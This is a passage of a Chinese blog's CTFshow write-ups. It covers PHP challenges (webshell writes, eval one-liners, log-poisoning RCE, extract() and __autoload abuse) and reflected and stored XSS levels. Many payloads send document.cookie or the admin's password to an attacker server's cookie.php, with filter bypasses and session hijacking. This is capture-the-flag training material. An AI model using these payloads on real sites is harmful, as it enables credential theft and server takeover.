unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs smali">scandir(string $directory,<span class="hljs-built_in"> int </span>$sorting_order = ?, resource $context = ?):<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>返回一个 array，包含有 directory 中的文件和目录。 <br>directory<br>    要被浏览的目录<br>sorting_order<br>默认的排序顺序是按字母升序排列。如果使用了可选参数 sorting_order（设为 1），则排序顺序是按字母降序排列。<br>返回值<br>成功则返回包含有文件名的 array，如果失败则返回 false<br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">foreach</span> 语法结构提供了遍历数组的简单方式。<span class="hljs-keyword">foreach</span> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：<br><span class="hljs-keyword">foreach</span> (iterable_expression <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)<br>    statement<br><span class="hljs-keyword">foreach</span> (iterable_expression <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>    statement<br>第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 <span class="hljs-variable">$value</span>。<br>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <span class="hljs-variable">$key</span>。 <br>例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-variable">$value</span> * <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-comment">// 现在 $arr 是 array(2, 4, 6, 8)</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, resource <span class="hljs-variable">$context</span> = ?): <span class="hljs-keyword">bool</span><br>删除 filename。<br>filename<br>    文件的路径。<br>返回值<br>成功时返回 <span class="hljs-literal">true</span>， 或者在失败时返回 <span class="hljs-literal">false</span>。<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这题就是利用file_put_content函数写入文件然后执行命令</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">重写index，写个马进去 然后访问index POST:cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /ctfshow_fl0g_here.txt&#x27;</span>);<br>ctf=index.php<br>show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /c*&#x27;</span>;)<span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);<span class="hljs-comment">//查看目录</span><br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac /ctfshow_fl0g_here.txt&quot;</span>);<span class="hljs-comment">//查看flag</span><br></code></pre></td></tr></table></figure><p><strong>非预期</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=index.php<br>POST：show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-150（日志包含rce）"><a href="#web-150（日志包含rce）" class="headerlink" title="web-150（日志包含rce）"></a>web-150（日志包含rce）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTFSHOW</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$vip</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;vip = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;secret;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isVIP</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;vip?<span class="hljs-literal">TRUE</span>:<span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">extract </span>— 从数组中将变量导入到当前的符号表<br><br>class_exists — 检查类是否已定义<br></code></pre></td></tr></table></figure><p>所以我们可以传入isVIP&#x3D;1，通过<code>extract()</code>将原来的值覆盖掉</p><p>然后利用日志文件包含来rce</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">日志路径是/var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent:<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br>GET:?isVIP=<span class="hljs-number">1</span><br>POST:ctf=/<span class="hljs-keyword">var</span>/log/nginx/access.log&amp;a=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fl*&quot;</span>);<br></code></pre></td></tr></table></figure><p>现在UA头里写入一句话，EXECUTE</p><p>然后进行日志包含：POST</p><p>让$isVIP等于1：GET        EXECUTE</p><p>&#x2F;&#x2F;如果出不来，就换一个浏览器</p><hr><h2 id="web-150plus（-autoload-）"><a href="#web-150plus（-autoload-）" class="headerlink" title="web-150plus（__autoload()）"></a>web-150plus（__autoload()）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTFSHOW</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$vip</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;vip = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;secret;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isVIP</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;vip?<span class="hljs-literal">TRUE</span>:<span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//注意从这里class已经结束了，下面是一个专门的方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>,<span class="hljs-string">&quot;log&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>不能有：，也不能有log了</p><p><strong>function autoload是当进行类判断的时候(if(class_exists)，会自动调用function autoload</strong></p><p><strong>所以要尝试控制</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_CTFSHOW_</span><br></code></pre></td></tr></table></figure><p><strong>因为_被ban</strong></p><p><strong>可以用..来绕过</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?.</span>.<span class="hljs-variable constant_">CTFSHOW</span>..=phpinfo<br></code></pre></td></tr></table></figure><p><strong>原本要在进行文件包含，但是服务器负载较大，所以这个phpinfo里面就有flag</strong></p><p><strong>直接CTRL+F，查找flag就行了</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> php特性 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xss</title>
      <link href="/2025/02/23/ctfshow-xss/"/>
      <url>/2025/02/23/ctfshow-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="web-xss"><a href="#web-xss" class="headerlink" title="web-xss"></a>web-xss</h1><h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><h2 id="web-316（无过滤）"><a href="#web-316（无过滤）" class="headerlink" title="web-316（无过滤）"></a>web-316（无过滤）</h2><p>打开页面发现有个输入框，并从题目可以看到这关为反射性xss</p><p><img src="/../image/web-xss-1.png"></p><p>尝试写入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>可以弹框</p><p><img src="/../image/web-xss-2.png"></p><p>这关的flag藏在admin管理员的cookie中</p><p>所以我们在我们自己的云服务器中写一个用来接收cookie的php文件，名为cookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br>    <br>    <span class="hljs-comment">// 过滤和清理用户输入</span><br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$cookie</span>); <span class="hljs-comment">// 过滤特殊字符</span><br>    <span class="hljs-comment">// 其他可能的过滤和验证</span><br> <br>    <span class="hljs-comment">// 写入文件</span><br>    <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;cookie.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$myfile</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Cookie 已成功写入文件。&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;无法打开文件进行写入。&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未提供 cookie 数据。&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再输入框中输入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://服务器IP/cookie.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当这行代码提交后会有类似admin管理员的程序每隔一段时间就查看我们提交的连接，然后就可以拿到admin的cookie，我们服务器端目录内就会生成cookie.txt，flag就在里面</p><h2 id="web-317（script过滤绕过）"><a href="#web-317（script过滤绕过）" class="headerlink" title="web-317（script过滤绕过）"></a>web-317（script过滤绕过）</h2><p>使用上一关的payload不行，猜测是过滤了script，尝试了下大小写混合也不行。</p><p>试了<code>&lt;img src=&#39;&#39; onerror=&#39;alert(1)&#39;&gt;</code>能弹窗，但是拿不到cookie</p><p>试下<code>&lt;body οnlοad=&#39;alert(1)&#39;&gt;</code>和<code>&lt;svg onload=&#39;alert(1)&#39;&gt;</code>发现可以</p><p><strong>onload属性：只要标签被加载就会触发</strong></p><p><strong>location.href：重定向到指定的url连接</strong></p><p>使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>/&gt;<br><br>或者<br><br>&lt;body <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-318（img，script过滤绕过）"><a href="#web-318（img，script过滤绕过）" class="headerlink" title="web-318（img，script过滤绕过）"></a>web-318（img，script过滤绕过）</h2><p>试了一下发现过滤了img和script，继续使用上一关的payload即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>/&gt;<br><br>或者<br><br>&lt;body <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-319（body，script过滤绕过）"><a href="#web-319（body，script过滤绕过）" class="headerlink" title="web-319（body，script过滤绕过）"></a>web-319（body，script过滤绕过）</h2><p>试了下发现body又被过滤了，但是svg依然没被过滤，还是可以用<code>&lt;svg onload=&#39;alert(1)&#39;&gt;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg <span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>/&gt;<br><br>或者<br><br>&lt;iframe οnlο<span class="hljs-attribute">ad</span>=<span class="hljs-string">&quot;document.location=&#x27;http://服务器ip/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-320（空格过滤绕过）"><a href="#web-320（空格过滤绕过）" class="headerlink" title="web-320（空格过滤绕过）"></a>web-320（空格过滤绕过）</h2><p>在之前的基础上又多过滤了空格，这里有好几种绕过方法</p><p>%0A换行符，%09（就是空格，这里好像绕过不了），&#x2F;，&#x2F;**&#x2F;</p><p><strong>尝试<code>&lt;svg/onload=&#39;alert(1)&#39;&gt;</code>成功弹框，</strong></p><p>这里试了下%0A发现不行，&#x2F;**&#x2F;可以</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-321"><a href="#web-321" class="headerlink" title="web-321"></a>web-321</h2><p>用上一题的payload即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-322（xss过滤绕过）"><a href="#web-322（xss过滤绕过）" class="headerlink" title="web-322（xss过滤绕过）"></a>web-322（xss过滤绕过）</h2><p>这题多过滤了一个xss，但是我们之前的payload中没有xss，所以用之前的payload即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg/<span class="hljs-attribute">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://服务器IP/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web-323-326"></a>web-323-326</h2><p>一直到326都和上题一样解法</p><h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><h2 id="web-327（管理员cookie获取）"><a href="#web-327（管理员cookie获取）" class="headerlink" title="web-327（管理员cookie获取）"></a>web-327（管理员cookie获取）</h2><p>要接收管理员的cookie，所以收件人需要是admin才能发送成功</p><p><img src="/../image/web-xss-3.png"></p><h2 id="web-328（管理员cookie获取盗用）"><a href="#web-328（管理员cookie获取盗用）" class="headerlink" title="web-328（管理员cookie获取盗用）"></a>web-328（管理员cookie获取盗用）</h2><p>打开发现是一个登录注册界面。</p><p><img src="/../image/web-xss-4.png"></p><p>发现有一个用户管理页面，只有管理员可见，管理员可以用它看到所有用户的用户名和密码，所以这里就存在存储型的xss漏洞。</p><p><img src="/../image/web-xss-5.png"></p><p>我们在注册时在用户名和密码中插入xss攻击语句，当管理员打开用户管理页面就会触发，我们就能拿到管理员的cookie了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://服务器IP/cookie.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../image/web-xss-6.png"></p><p>拿到cookie之后，然后再访问用户管理界面，用burp抓包，将cookie改成admin的cookie</p><p><strong>注意：这里cookie是会变化的，所以要快，而且要用最新的cookie,这里有点恶心，我试了很多次才成功</strong></p><p><strong>好像在重放器里就不用这么麻烦了。</strong></p><p><img src="/../image/web-xss-7.png"></p><h2 id="web-329（通过类名查找元素，通过document获取）"><a href="#web-329（通过类名查找元素，通过document获取）" class="headerlink" title="web-329（通过类名查找元素，通过document获取）"></a>web-329（通过类名查找元素，通过document获取）</h2><p>依旧利用cookie，这题也能得到cookie，但是cookie一下就会失效,原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p><p>我们可以通过类名查找元素，通过document来获取</p><p>可以看到前端代码中将要显示admin密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p><p><img src="/../image/web-xss-8.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://服务器IP/cookie.php?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)[<span class="hljs-number">1</span>].<span class="hljs-property">innerHTML</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">window<span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;http://ip/&#x27;</span> + document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)<span 